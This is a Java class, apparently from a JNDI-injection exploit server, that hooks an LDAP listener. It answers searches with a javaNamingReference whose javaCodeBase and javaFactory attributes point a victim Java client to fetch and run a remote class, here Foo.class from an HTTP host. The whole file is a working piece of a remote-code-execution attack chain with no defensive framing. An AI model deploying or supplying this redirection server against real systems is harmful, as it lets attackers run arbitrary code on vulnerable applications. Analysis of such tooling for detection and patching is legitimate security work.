package server.ldap.interceptor;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.net.URL;

public class OperationInterceptor implements LDAPInterceptor {
    private URL codebase;

    public OperationInterceptor(URL codebase) {
        this.codebase = codebase;
    }

//    @Override
//    public void processSearchResult(InMemoryInterceptedSearchResult result) {
//        String base = result.getRequest().getBaseDN();
//        Entry entry = new Entry(base);
//        try {
//            this.sendResult(entry, result);
//        } catch (Exception e1) {
//            e1.printStackTrace();
//        }
//    }

    @Override
    public void sendResult(Entry entry, InMemoryInterceptedSearchResult result) throws LDAPException {
        entry.addAttribute("javaClassName", "foo");
        String cbRaw = this.codebase.toString();
        int refIdx = cbRaw.lastIndexOf("/");
        if (refIdx > 0) {
            cbRaw = cbRaw.substring(0, refIdx + 1);
        }
        // javaCodeBase: http://127.0.0.1:8080/
        entry.addAttribute("javaCodeBase", cbRaw);
        entry.addAttribute("objectClass", "javaNamingReference");
        // javaFactory: Foo
        entry.addAttribute("javaFactory", "Foo");
        // client request: http://127.0.0.1:8080/Foo.class
        System.out.printf("[LDAP] send redirection to %s \n", this.codebase);

        result.sendSearchEntry(entry);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
